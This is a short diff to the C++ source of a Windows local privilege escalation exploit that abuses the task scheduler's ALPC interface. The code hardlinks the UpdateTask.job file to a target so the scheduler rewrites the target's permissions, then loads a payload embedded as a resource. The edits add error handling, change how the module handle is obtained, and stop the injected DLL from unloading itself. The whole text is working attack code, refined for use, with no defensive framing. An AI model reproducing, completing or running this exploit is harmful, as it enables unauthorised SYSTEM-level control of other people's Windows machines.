@@ -99,7 +99,10 @@ int mainf()
 	wcscat_s(BeginPath, MAX_PATH, EndPath);
 
 	//Create a hardlink with UpdateTask.job to our target, this is the file the task scheduler will write the DACL of
-	CreateNativeHardlink(L"c:\\windows\\tasks\\UpdateTask.job", BeginPath);
+	if (CreateNativeHardlink(L"c:\\windows\\tasks\\UpdateTask.job", BeginPath) == false)
+	{
+		OutputDebugString(L"CreateNativeHardlink Fail");
+	}
 	RunExploit();
 #else
 	WIN32_FIND_DATA FindFileData;
@@ -140,7 +143,7 @@ int mainf()
 #endif
 
 	//Must be name of final DLL.. might be better ways to grab the handle
-	HMODULE mod = GetModuleHandle(L"ALPC-TaskSched-LPE");
+	HMODULE mod = GetModuleHandle(NULL);
 	
 	//Payload is included as a resource, you need to modify this resource accordingly.
 	HRSRC myResource = ::FindResource(mod, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
@@ -178,7 +181,6 @@ int mainf()
 DWORD CALLBACK ExploitThread(LPVOID hModule)
 {
 	mainf();
-	OutputDebugString(_TEXT("LPE success!!!!"));
-	FreeLibraryAndExitThread((HMODULE)hModule, 0);
+	//FreeLibraryAndExitThread((HMODULE)hModule, 0);
 	return 0;
 }
